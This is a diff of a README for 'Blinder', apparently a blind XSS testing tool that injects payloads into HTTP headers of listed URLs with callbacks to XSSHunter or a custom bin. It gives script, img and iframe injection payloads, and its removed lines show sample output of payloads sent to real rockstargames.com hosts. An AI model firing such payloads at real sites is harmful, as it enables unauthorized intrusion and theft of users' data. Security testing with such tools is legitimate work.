@@ -21,53 +21,52 @@ python3 Blinder.py [ARGS]
 - Selecting Your Own Replace String That Will Be Replaced To Your XSSHunter/Bin
 - Cleaner Code!
 
-### How To Use:
-- For Basic Usage With a Basic Payload You Can Just The Script Using This:
-
+## How To Use:
+#### Basic:
+- You Can Run Blinder In a Basic Usage By Just Using This Command. Where `-u` Options Is Your XSSHunter Username And `-f` Is The File That Contains The URLs With NewLine Seprator
 ```
-python3 Blinder.py -f URLs.txt -u hacker -r allow
-```
-
-- The Script Can't Run Without Getting The Redirection Rule. You Can Select Between `allow` and `deny` That Chooses If The Redirections Will Be Followed In This Case Or Not.
-
-- To Add Your Own Payload You Have To Use `XXX` On Your Payload So It Could Be Replaced With The XSSHunter/ExternalBin. For Example If You Want To Create Your Own Payload It Will Look Like This:
-
-```
-python3 Blinder.py -f URLs.txt -u hacker -r allow -p '"><img src="XXX">'
+python3 Blinder.py -u hacker -f URLs
 ```
 
-- Make Sure The `XXX` In This Case Are Able In a Upper Case.
+#### Redirections
+- To Disallow/Allow Redirections You Can Use `-r` Options With The Rule You Want. Disallowing Redirections Will Make The Tool Faster But It Might Miss Some Results. By Default Redirections Is Allowed On Blinder
 
-- To Use Your Own ExternalBin Instead Of XSSHunter You Have To Use `-b` Option. With Your External Host Including The Protocol. For Example
+- The Redirection Rules Are `allow` and `deny` In LowerCase. The Program Will Trigger An Error In Case You Used Something Else.
+```
+python3 Blinder.py -u hacker -f URLs -file -r deny
+```
+#### Payloads And Multi Payloads.
+- In Blinder The Default Payload Is `"><script src=XSSHunter></script>`That's The Same as The Default One On XSShunter Website. In Case You Want To Use Another Payloads For XSS Or Something Else Like SSTI , CSTI You Can Add It Using `-p` Option That Can Be Used With Some Command Like The First Example
+
+- In Case You Want To Use Multi Payloads You Can Add Your Payloads Then Seprate Them Using `,` For Default Usage, See The Second Example For That, In Case You Want To Seprate Them By Something Else You Can Use `-s` Option. And You Will Find It In The Third Example. 
+
+- You Can Select What Text You Want To Get Replaced To Your XSSHunter/Bin Using `--replace` Option. You Will Get a Sample In The Forth Example. Also, In Case You Didn't Add The Replace String The Program Will Use `XXX` For Default.
+```
+python3 Blinder.py -u hacker -f URLs -p '"><img src="XXX">'
+```
+```
+python3 Blinder.py -u hacker -f URLs -p '<img src="XXX">,<iframe src="XXX">'
+```
+```
+python3 Blinder.py -u hacker -f URLs -p '<img src="XXX">_<iframe src="XXX">' -s '_'
+```
 
 ```
-python3 Blinder.py -f URLs.txt -b https://www.example.com/ -r allow -p '"><img src="XXX">'
+python3 Blinder.py -u hacker -f URLs -p '<img src="RRR">_<iframe src="RRR">' -s '_' --replace 'RRR'
 ```
 
-- If You Didn't Add a Payload In Any Cases, Blinder Will Auto Set The Default XSSHunter XSS Payload To Use It.
-
-- You Can Use Multi Payloads With The Requests By Adding a Split Char Between Them You Can Select. If You Didn't Add The Split Char The Program Will Auto Set It Into `,` In This Case. To Use Multi Payloads It Will Look Like This
-
-```
-python3 Blinder.py -f URLs.txt -u hacker -r allow -p '"><img src="XXX">','"><iframe src="XXX">' -s ,
-```
-- The Output Will Be Something Like That In This Case.
+#### Headers
+- In This New Update You Can Select What Headers You Want To Use To Send The Payloads On. The Default Is The `User-Agent` Header But You Can Add Your Own Header Using `--header` Option. See The Example Below
 
 ```
-Request Has Been Sent To: https://scapi.rockstargames.com, Status-Code: 403 , Payload: "><img src="https://hacker.xss.ht/">
-Request Has Been Sent To: https://scapi.rockstargames.com, Status-Code: 403 , Payload: "><iframe src="https://hacker.xss.ht/">
-Request Has Been Sent To: http://scapi.rockstargames.com, Status-Code: 301 , Payload: "><img src="https://hacker.xss.ht/">
-Request Has Been Sent To: http://scapi.rockstargames.com, Status-Code: 301 , Payload: "><iframe src="https://hacker.xss.ht/">
-Request Has Been Sent To: https://prod.p01ewr.pod.rockstargames.com, Status-Code: 200 , Payload: "><img src="https://hacker.xss.ht/">
-Request Has Been Sent To: https://prod.p01ewr.pod.rockstargames.com, Status-Code: 200 , Payload: "><iframe src="https://hacker.xss.ht/">
-Request Has Been Sent To: https://prod.p02sjc.pod.rockstargames.com, Status-Code: 200 , Payload: "><img src="https://hacker.xss.ht/">
-Request Has Been Sent To: https://prod.p02sjc.pod.rockstargames.com, Status-Code: 200 , Payload: "><iframe src="https://hacker.xss.ht/">
-Request Has Been Sent To: https://prod.p02ewr.pod.rockstargames.com, Status-Code: 200 , Payload: "><img src="https://hacker.xss.ht/">
-Request Has Been Sent To: https://prod.p02ewr.pod.rockstargames.com, Status-Code: 200 , Payload: "><iframe src="https://hacker.xss.ht/">
-Request Has Been Sent To: https://warehouse.rockstargames.com, Status-Code: 302 , Payload: "><img src="https://hacker.xss.ht/">
-Request Has Been Sent To: https://warehouse.rockstargames.com, Status-Code: 302 , Payload: "><iframe src="https://hacker.xss.ht/">
-Request Has Been Sent To: https://prod.p01sjc.pod.rockstargames.com, Status-Code: 200 , Payload: "><img src="https://hacker.xss.ht/">
-Request Has Been Sent To: https://prod.p01sjc.pod.rockstargames.com, Status-Code: 200 , Payload: "><iframe src="https://hacker.xss.ht/">
+python3 Blinder.py -u hacker -f URLs --header test
+```
+
+#### External Bin
+- In Case You Don't Want To Use XSSHunter And You Have Your Own Requeest Bin That Can Collect The Users Data You Can Use `-b` Option With Your External Bin Including The Protocol `http:` `https:`
+
+```
+python3 Blinder.py -b https://site.com/ -f URLs
 ```
 
 ### Something Isn't Working Or You Want To Improve Something?
